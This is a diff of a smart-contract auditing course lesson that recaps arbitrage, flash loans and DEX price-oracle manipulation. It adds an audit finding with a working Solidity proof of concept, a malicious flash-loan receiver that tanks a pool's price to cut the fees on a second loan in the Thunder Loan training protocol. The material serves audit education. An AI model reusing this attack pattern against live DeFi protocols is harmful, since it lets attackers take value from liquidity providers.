@@ -2,56 +2,174 @@
 title: Oracle Manipulation Recap
 ---
 
-# Flash Loans: Making Blockchain Arbitrage Accessible
+### Oracle Manipulation Recap
 
-Arbitrage, the simultaneous buying and selling of assets in different markets to take advantage of differing prices, has long been an effective strategy for the 'financially fearless' among us. A concept traditionally dominated by the deep-pocketed whales of Wall Street, the decentralised finance (DeFi) world is flipping the field on its head with the application of flash loans.
+Alright! Let's review everything up to this point, starting from the top.
 
-Can't tell your flash loans from your DeFi? No worries, mate. Let's dive deep into it all and level the arbitrage playing field!
+### Arbitrage
 
-### The Magic of Flash Loans
+Arbitrage is the process by which a profit can be made by identifying a price discrepancy of an asset across two exchanges and buying from one then selling on the other. Through this process the asset price becomes normalized across listings.
 
-But what's a flash loan? A flash loan is a loan that lasts exactly one transaction! Quite an alien concept to anyone versed in traditional finance, this tool is peculiar and unique to the DeFi blockchain realm.
+This is one of the primary use cases of flash loans.
 
-```markdown
-"It is a loan that lasts exactly one transaction."
+<img src="../../../../static/security-section-6/41-oracle-manipulation-recap/oracle-manipulation-recap1.png" width="100%" height="auto">
+
+### Flash Loans
+
+A Flash Loan is a loan which lasts for a single transaction. It allows any user to borrow a large number of funds without posting collateral by paying a small fee.
+
+The catch, of course, is that the loan must be repaid in the same transaction in which it is borrowed. If it isn't, the transaction will revert.
+
+The fees collected from flash loans serve as incentive for those supplying liquidity to the flash loan protocol.
+
+In the case of a recognized price discrepancy, this means any user would be able to take greater advantage of the arbitrage opportunity and the greatest profits aren't reserved for whales or those with the most money.
+
+<img src="../../../../static/security-section-6/41-oracle-manipulation-recap/oracle-manipulation-recap2.png" width="100%" height="auto">
+
+### Oracle Manipulation
+
+Finally, we covered how flash loans and the impact they have on Dex prices of assets can actually be a vulnerability to protocols relying on those Dexs as price oracles.
+
+Flash Loans have the potential of drastically altering the ratio based pricing of asset pairs on Dexs by affording a user the ability to swap huge numbers of a token and tanking it's price - for that transaction.
+
+The practical offshoot of this is that any protocol that reads from that Dex is going to trust this inaccurate, temporarly price, leaving itself open to exploitation or unfavorable transactions.
+
+### Thunder Loan Oracle Manipulation
+
+We illustrated that the Thunder Loan protocol was vulnerable to this exact exploit, and we did so with a _very_ thorough proof of code.
+
+It was shown that by flash loaning and swapping on TSwap, an attacker could drastically reduce the cost of the fees to be paid, resulting in a medium severity finding!
+
+<details>
+<summary>Oracle Manipulation PoC</summary>
+
+**Proof of Concept:** The following all happens in 1 transaction.
+
+1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
+   1. User sells 1000 `tokenA`, tanking the price.
+   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`.
+      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper.
+
+```javascript
+    function getPriceInWeth(address token) public view returns (uint256) {
+        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
+@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
+    }
 ```
 
-![](https://cdn.videotap.com/VtEQgP01EvzX42ymoqp1-45.63.png)
+    3. The user then repays the first flash loan, and then repays the second flash loan.
 
-Why so peculiar, you ask? That's because a flash loan smart contract can stipulate 'if you don't pay me back, I will just revert everything that you've done'. Imagine the applications!
+Add the following to ThunderLoanTest.t.sol.
 
-### Where the Whales Swim: An Example
+<details>
+<summary>Proof of Code:</summary>
 
-This is where it gets interesting. Major players (whales) deposit large sums of money into protocols that host flash loans. Why? Because every flash loan carries a fee, incentivising whales to keep their money safely in the protocol. But how does this tie into arbitrage, and why should we care?
+```js
+function testOracleManipulation() public {
+    // 1. Setup contracts
+    thunderLoan = new ThunderLoan();
+    tokenA = new ERC20Mock();
+    proxy = new ERC1967Proxy(address(thunderLoan), "");
+    BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
+    // Create a TSwap Dex between WETH/ TokenA and initialize Thunder Loan
+    address tswapPool = pf.createPool(address(tokenA));
+    thunderLoan = ThunderLoan(address(proxy));
+    thunderLoan.initialize(address(pf));
 
-Well, let's scope out a practical application of flash loans in our arbitrage world.
+    // 2. Fund TSwap
+    vm.startPrank(liquidityProvider);
+    tokenA.mint(liquidityProvider, 100e18);
+    tokenA.approve(address(tswapPool), 100e18);
+    weth.mint(liquidityProvider, 100e18);
+    weth.approve(address(tswapPool), 100e18);
+    BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
+    vm.stopPrank();
 
-Imagine two different cryptocurrency exchanges present a price discrepancy for the same asset. If you had the funds, you could buy from one exchange at a lower price and sell on the other at a higher price, making a neat profit. This requires substantial initial investment to explore, which is where flash loans change the game completely.
+    // 3. Fund ThunderLoan
+    vm.prank(thunderLoan.owner());
+    thunderLoan.setAllowedToken(tokenA, true);
+    vm.startPrank(liquidityProvider);
+    tokenA.mint(liquidityProvider, 100e18);
+    tokenA.approve(address(thunderLoan), 100e18);
+    thunderLoan.deposit(tokenA, 100e18);
+    vm.stopPrank();
 
-Flash loans democratize the arbitrage domain, allowing even the smallest fish in the sea to swim amongst the whales. By providing the funds for the duration of one transaction, users can perform arbitrages without owning the requisite amount at the outset!
+    uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
+    console2.log("Normal Fee is:", normalFeeCost);
 
-### Flash Loans and DeFi: A New Era of Financial Democracy
+    // 4. Execute 2 Flash Loans
+    uint256 amountToBorrow = 50e18;
+    MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
+        address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
+    );
 
-In a regular finance landscape, opportunities for arbitrage are available exclusively to the wealthy class. The DeFi landscape transforms the traditional constructs of finance by opening these virtual doors to anyone and everyone. Flash loans are an empowering tool for the smaller fish to leapfrog the barriers of entry and start swimming in the arbitrage ocean.
+    vm.startPrank(user);
+    tokenA.mint(address(flr), 100e18);
+    thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, ""); // the executeOperation function of flr will
+        // actually call flashloan a second time.
+    vm.stopPrank();
 
-```markdown
-"DeFi levels the playing field and allows anyone to take advantage of these opportunities."
+    uint256 attackFee = flr.feeOne() + flr.feeTwo();
+    console2.log("Attack Fee is:", attackFee);
+    assert(attackFee < normalFeeCost);
+}
+
+contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    address repayAddress;
+    BuffMockTSwap tswapPool;
+    bool attacked;
+    uint256 public feeOne;
+    uint256 public feeTwo;
+
+    // 1. Swap TokenA borrowed for WETH
+    // 2. Take out a second flash loan to compare fees
+    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
+        tswapPool = BuffMockTSwap(_tswapPool);
+        thunderLoan = ThunderLoan(_thunderLoan);
+        repayAddress = _repayAddress;
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        if (!attacked) {
+            feeOne = fee;
+            attacked = true;
+            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
+            IERC20(token).approve(address(tswapPool), 50e18);
+            // Tanks the price:
+            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
+            // Second Flash Loan!
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
+            // We repay the flash loan via transfer since the repay function won't let us!
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        } else {
+            // calculate the fee and repay
+            feeTwo = fee;
+            // We repay the flash loan via transfer since the repay function won't let us!
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        }
+        return true;
+    }
+}
 ```
 
-### Life in the Flash Lane: From Arbitrage to Collapse
+</details>
 
-Another fascinating interaction that can occur between flash loans and DeFi protocols involves ‘price manipulation’. Here, users leverage flash loans to manipulate the price on a decentralized exchange (DEX), resulting in opportunities for further trading advantages.
+</details>
 
-![](https://cdn.videotap.com/0dhGroKi4k72ZIMv0UAb-130.37.png)
+---
 
-This tactic is illustrated in a test we conducted using an imaginary 'Thunder Loans' protocol. We set it up, requested a flash loan, and manipulated the reserve ratios of the DEX, causing a significant change in price. This setup enabled us to borrow another flash loan, this time with a substantially lower fee due to the manipulated rates.
+<img src="../../../../static/security-section-6/41-oracle-manipulation-recap/oracle-manipulation-recap3.png" width="100%" height="auto">
 
-This might sound somewhat unscrupulous, as the liquidity providers (the whales) lose out, yet the strategy worked. We completed all the necessary moves, hit the 'Thunderloan flash loan' button, manipulated the contract code, ensured the change in reserves, and witnessed the price drop from a 1:1 ratio down to a 1:2 ratio.
+This section was heavy. Now's a great time to take a break before continuing on.
 
-Finally, we executed another flash loan, leaving us with a drastically cheaper fee due to our manipulations with the initial flash loan. We then repaid this loan, leading us into an intriguing question: What if we didn't need to repay?
-
-![](https://cdn.videotap.com/CTDan8syFjGyGDy0iJ02-156.44.png)
-
-This was quite a jog around the DeFi neighborhood and our thrilling exploration of flash loans. Now, take a breather, grab some water or coffee, and let’s gear up for the next leg of this captivating journey in the fantastic world of blockchain technology!
-
-Remember, with DeFi and flash loans, the future of finance is truly in your hands.
+We're nearly there.
